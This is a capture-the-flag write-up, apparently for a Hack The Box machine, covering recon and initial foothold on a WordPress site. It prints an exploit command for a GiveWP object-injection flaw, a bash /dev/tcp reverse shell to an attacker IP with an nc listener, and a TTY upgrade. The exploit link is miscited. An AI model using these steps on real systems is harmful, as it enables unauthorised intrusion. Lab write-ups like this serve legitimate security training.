# Recon
### 1) Ping + full nmap sweep
nmap -sS -sV -sU 10.129.126.97


Result (trimmed):
```bash
PORT   STATE  SERVICE VERSION
22/tcp open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open   http    nginx 1.28.0
68/udp open|filtered dhcpc
```

Target is a Linux host with SSH and an nginx-served website.

### 2) Quick web poke
```bash
curl -I http://10.129.126.97/
curl http://10.129.126.97/ | sed 's/>/\n/g' | grep -iE 'wp-|wordpress|give'
```

The HTML/CSS/JS paths clearly referenced WordPress assets and GiveWP (donation) plugin files. To be sure via nmap:

nmap -p80 --script http-generator 10.129.126.97

-> WordPress 6.8.1

### 3) Virtual host awareness

I noticed the site referenced giveback.htb. Many WP installs require correct Host/SiteURL, so I pinned the vhost:
```bash
echo "10.129.126.97 giveback.htb" | sudo tee -a /etc/hosts
```

# Enumeration
### 4) Enumerate GiveWP donation forms via REST API

The GiveWP plugin registers a custom post type give_forms. I pulled published forms:
```bash
curl -s http://10.129.126.97/wp-json/wp/v2/give_forms?per_page=100 | jq '.[].link, .[].id'
# -> "http://10.129.126.97/donations/the-things-we-need/"
# -> 17
```

So the interesting form is ID 17, slug the-things-we-need:

http://giveback.htb/donations/the-things-we-need/


(I also tried a quick directory brute force and a basic wpscan for coverage. They weren’t necessary once GiveWP panned out.)

Initial Foothold (RCE → Shell)
5) Vulnerability: GiveWP Unauthenticated PHP Object Injection → RCE

GiveWP had a 2024 bug (CVE-2024-5932) that enables unauthenticated POI → RCE via the donation submission flow. I cloned a PoC and targeted the live donation form page.
https://www.exploit-db.com/exploits/49178
Proof of RCE (simple command)
```bash
python CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c "id"
```

I also used a tiny “exfil over GET” trick to see command output reliably from blind contexts (base64 id then GET back to my listener). Once I confirmed code exec, I moved on to a reverse shell.

Note: I briefly tested an older wp-file-manager exploit (CVE-2020-25213, EDB-ID 49178). The banner showed, but it didn’t land — likely the plugin wasn’t present. I dropped that path and stuck with GiveWP.

### 6) Pop a reverse shell

Start a listener on my VPN interface:

On attacker box (tun0)
```bash
nc -lvnp 4444
```

Trigger reverse shell from the RCE:
```bash
python CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c 'bash -lc "bash -i >& /dev/tcp/10.10.16.X/4444 0>&1"'
```

(Replace 10.10.16.X with your tun0 IP.)

Listener received connection → basic interactive shell (typically as www-data behind nginx).

### 7) TTY upgrade (quality-of-life)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
```

At this point I had a stable interactive shell on the target. 
